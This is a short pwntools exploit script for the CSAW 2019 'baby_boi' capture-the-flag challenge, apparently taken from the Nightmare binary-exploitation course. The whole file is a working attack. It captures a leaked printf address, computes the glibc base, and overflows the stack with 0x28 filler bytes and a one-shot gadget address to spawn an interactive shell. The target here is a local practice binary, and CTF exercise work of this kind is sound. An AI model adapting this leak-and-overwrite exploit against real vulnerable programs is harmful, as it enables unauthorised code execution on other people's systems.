from pwn import *

# Establish the target
target = process('/home/kali/pwn/nightmare/08-bof_dynamic/csaw19_babyboi/baby_boi')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pid = util.proc.pidof(target)[0]
print("The pid is " + str(pid))
#util.proc.wait_for_debugger(pid)

target.recvuntil(b"ere I am: ")

# Scan in the infoleak
leak = target.recvline()
leak = leak.strip(b'\n')
print("printf va:" + hex(int(leak, 16)))
print("printf offset:" + hex(libc.symbols['printf']))
base = int(leak, 16) - libc.symbols['printf']

print("glibc base:" + hex(base))

# Calculate oneshot gadget
oneshot = base + 0xc741d

payload = b""
payload += b"0"*0x28            # Offset to oneshot gadget
payload += p64(oneshot)         # Oneshot gadget

# Send the payload
target.sendline(payload)

target.interactive()